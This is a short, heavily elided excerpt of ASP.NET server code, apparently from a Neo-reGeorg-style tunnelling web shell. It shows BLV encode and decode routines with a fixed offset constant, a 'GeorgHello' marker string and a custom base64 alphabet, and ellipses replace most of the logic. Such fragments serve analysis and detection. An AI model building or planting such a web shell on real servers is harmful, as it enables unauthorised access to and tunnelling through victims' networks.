...
<script runat="server">
    ...
    public static Object[] blv_decode(byte[] data) {
        ...
        while ( i < data_len ) {
            ...
            int l = bytesToInt(length) - 1966546385;
            byte[] v = new byte[l];
    ...
    public static byte[] blv_encode(Object[] info) {
        ...
        for (int b = 0; b < info.Length; b++) {
            if ( info[b] != null ) {
                ...
                try {
                    byte[] l = intToBytes(v.Length + 1966546385);
...
<%
    ...
    String GeorgHello = "6UNI/jhLR7X7fqPmY+m0BofOMNXNbVV2XNbiEVEODRxUbshHWKXC/mQWx0SNYVDFx1bKY0VDjcS3RcS/nGIOzVA0XOdI/cy=";

    Object[] info  = new Object[40];
    Object[] rinfo = new Object[40];

    String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    String de = "dhULNVGsuAk/MxH6ibjcEfRqDWYznXBe9Pl7+SKoZ8pJaICgrQO0mF21yv345wtT";
